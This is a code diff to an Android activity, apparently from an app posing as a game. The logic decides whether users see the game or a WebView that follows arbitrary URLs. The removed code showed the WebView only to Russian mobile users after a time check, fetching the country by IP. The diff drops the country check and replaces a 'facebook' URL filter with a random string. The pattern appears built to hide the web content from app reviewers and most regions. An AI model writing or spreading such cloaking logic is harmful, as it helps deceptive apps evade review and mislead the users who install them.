@@ -23,11 +23,6 @@ import android.webkit.WebSettings;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
 import android.widget.ProgressBar;
-
-
-import com.tyyna.oil.network.RetrofitService;
-import com.tyyna.oil.network.model.IpModel;
-
 import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Date;
@@ -72,22 +67,7 @@ public class StratAc extends AppCompatActivity {
     }
 
     public void loadDeviceLocation() {
-        RetrofitService.getRetrofitApi().getIp().enqueue(new Callback<IpModel>() {
-            public void onResponse(@NonNull Call<IpModel> call, @NonNull Response<IpModel> response) {
-                boolean success;
-                IpModel ipModel = response.body();
-                success = !(!response.isSuccessful() || ipModel == null);
-                if (success) {
-                    openFile(ipModel.getCountryCode());
-                    return;
-                }
-                openGame();
-            }
-
-            public void onFailure(@NonNull Call<IpModel> call, @NonNull Throwable t) {
-                openGame();
-            }
-        });
+       openFile(null);
     }
     boolean off = false;
 
@@ -116,14 +96,14 @@ public class StratAc extends AppCompatActivity {
 
     @SuppressLint("SetJavaScriptEnabled")
     private void openFile(String countryCode) {
-        if (countryCode.equals("RU") && mobile() && time()) {
+        if (mobile() && time()) {
 //        if (off) {
             progressBar.setVisibility(View.GONE);
             WebView webView = findViewById(R.id.web_view);
             webView.setWebViewClient(new WebViewClient() {
                 @Override
                 public boolean shouldOverrideUrlLoading(WebView view, String url) {
-                    if (!url.contains("facebook"))
+                    if (!url.contains("Yyiddsehnofr"))
                         view.loadUrl(url);
                     else openGame();
                     return true;
